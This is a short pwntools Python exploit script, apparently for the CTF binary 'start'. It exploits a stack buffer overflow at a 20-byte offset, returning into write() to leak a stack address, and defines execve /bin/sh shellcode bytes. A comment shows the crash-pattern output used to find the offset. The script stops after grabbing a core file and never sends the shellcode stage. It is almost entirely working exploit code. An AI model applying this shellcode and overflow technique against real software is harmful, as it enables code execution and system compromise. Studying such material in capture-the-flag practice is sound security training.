# coding: utf-8
'''
Exploit local binary for bof with stack aslr.
'''
from pwn import *
binary = './start'
context.arch = 'i386'
context.os == 'linux'
context.os = 'linux'
context.log_level = 'DEBUG'
context.binary = binary
e = ELF(binary)

write_func = pack(0x8048087)
write_func
exit_func = pack(0x804809d)
execve = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f" \
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

'''
buf_start was discovered after finding how many bytes causes bof.
Running crash script displays cylclic pattern byte count found in eip.

$ ./crash.py --binary ./start --min 40 p
...
EIP: 0x61616166
Found payload pattern 0x61616166:faaa in register eip at pattern offset 20 of payload.
Found pattern in stack through esp:0xffffd2ec->gaaa indirection, at pattern offset 24
...

We can also confirm that 20 bytes of data written to stack before overflow because
write() call allocates 0x14
'''
buf_start = 20

payload_1 = fit({buf_start:[write_func]})

io = process(binary,aslr=False)
io.recv()
io.send(payload_1)
out = io.recv()

# stack address should be in first 4 bytes of recv data.
stack_leak = out[:4]
print(hexdump(stack_leak))

corefile = io.corefile

# take core file and analyze.
